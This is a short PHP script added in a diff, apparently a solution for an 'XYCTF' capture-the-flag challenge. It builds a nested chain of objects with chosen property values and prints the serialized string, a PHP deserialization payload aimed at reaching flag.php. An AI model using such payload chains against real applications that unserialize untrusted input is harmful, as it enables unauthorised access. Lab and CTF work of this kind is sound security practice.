@@ -1,0 +1,38 @@
+<?php
+
+
+
+// flag.php
+class XYCTFNO1
+{
+    public $Liu;
+    public $T1ng;
+    public $upsw1ng;
+
+
+}
+
+class XYCTFNO2
+{
+    public $crypto0;
+    public $adwa;
+
+
+}
+
+class XYCTFNO3
+{
+    public $KickyMu;
+    public $fpclose;
+    public $N1ght = "Crypto0";
+
+
+}
+
+$xyctf3=new XYCTFNO3();
+$xyctf3->N1ght='oSthing';
+$xyctf3->KickyMu=new XYCTFNO2();
+$xyctf3->KickyMu->adwa=new XYCTFNO1();
+$xyctf3->KickyMu->adwa->crypto0='dev1l';
+$xyctf3->KickyMu->adwa->T1ng='yuroandCMD258';
+echo(serialize($xyctf3));
